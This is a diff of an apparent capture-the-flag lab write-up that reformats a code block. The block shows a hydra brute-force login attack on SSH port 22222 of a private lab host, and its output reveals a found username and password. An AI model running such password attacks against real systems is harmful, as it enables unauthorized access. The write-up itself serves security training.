@@ -192,7 +192,9 @@ print "Password list has been successfully generated!"
 I had a password list and a username. That’s all I needed! SSH on port 22 was a dead end again, unlike port 22222.
 
 ```
-root@kali:~# hydra -l RickSanchez -P passwords.lst ssh://192.168.43.27:22222---snip---[DATA] attacking ssh://192.168.43.27:22222/
+root@kali:~# hydra -l RickSanchez -P passwords.lst ssh://192.168.43.27:22222
+---snip---
+[DATA] attacking ssh://192.168.43.27:22222/
 [22222][ssh] host: 192.168.43.27   login: RickSanchez   password: P7Curtains
 1 of 1 target successfully completed, 1 valid password found
 ---snip---
